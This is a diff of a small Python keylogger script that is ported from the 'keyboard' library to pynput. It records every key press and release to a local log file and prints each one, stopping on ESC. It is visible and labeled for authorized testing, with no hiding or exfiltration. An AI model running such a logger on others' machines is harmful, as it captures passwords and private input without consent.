@@ -1,38 +1,38 @@
 #!/usr/bin/env python3
 # keylogger.py – For personal/authorized testing only.
+# Works on Debian (aarch64) with pynput
 
-import keyboard
+from pynput.keyboard import Listener
 
 LOGFILE = "log.txt"
 
-
-def write_log(text):
+def write_log(line: str):
     with open(LOGFILE, "a", encoding="utf-8") as f:
-        f.write(text)
+        f.write(line + "\n")
 
+def on_press(key):
+    try:
+        line = f"alphanumeric key {key.char} pressed"
+    except AttributeError:
+        line = f"special key {key} pressed"
 
-def on_key(event):
-    name = event.name
+    print(line)
+    write_log(line)
 
-    if len(name) == 1:
-        log = name
-    elif name == "space":
-        log = " "
-    elif name == "enter":
-        log = "\n"
-    else:
-        log = f"[{name}]"
+def on_release(key):
+    try:
+        line = f"'{key.char}' released"
+    except AttributeError:
+        line = f"special key {key} released"
 
-    print(f"Key: {repr(log)}")
-    write_log(log)
+    print(line)
+    write_log(line)
 
-# Start recording
-keyboard.on_press(on_key)
+    if key == key.esc:
+        print("ESC pressed — exiting.")
+        return False  # Stop the listener
 
-print("Keylogger started. Press ctrl + shift + q to quit.")
-
-# Hotkey to stop the script
-keyboard.add_hotkey("ctrl+shift+q", lambda: exit())
-
-# Wait forever
-keyboard.wait()
+if __name__ == '__main__':
+    print("Keylogger started. Press ESC to quit.")
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
